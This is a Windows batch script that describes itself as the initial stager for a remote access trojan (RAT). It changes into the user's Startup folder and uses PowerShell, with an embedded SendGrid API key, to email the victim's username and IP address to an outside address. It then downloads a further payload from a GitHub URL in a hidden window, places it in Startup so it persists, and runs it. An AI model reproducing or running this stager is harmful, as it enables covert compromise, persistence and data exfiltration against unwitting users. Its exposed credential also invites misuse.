
@REM @echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@REM move into startup directory
cd %STARTUP%

@REM Set up SMTP
powershell -NoProfile -Command "Invoke-RestMethod -Uri 'https://api.sendgrid.com/v3/mail/send' -Method Post -Headers @{Authorization='Bearer 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'} -ContentType 'application/json' -Body ('{""personalizations"":[{""to"":[{""email"":""fyp22356827@outlook.com""}]}],""from"":{""email"":""lukeosullivan123@gmail.com""},""subject"":""' + $env:UserName + ' logs"",""content"":[{""type"":""text/plain"",""value"":""' + ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress -join ', ') + '""}]}')"

pause
@REM writeS payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload placeholder
powershell ./wget.cmd


@REM cd %initialPath%
@REM del init.cmd
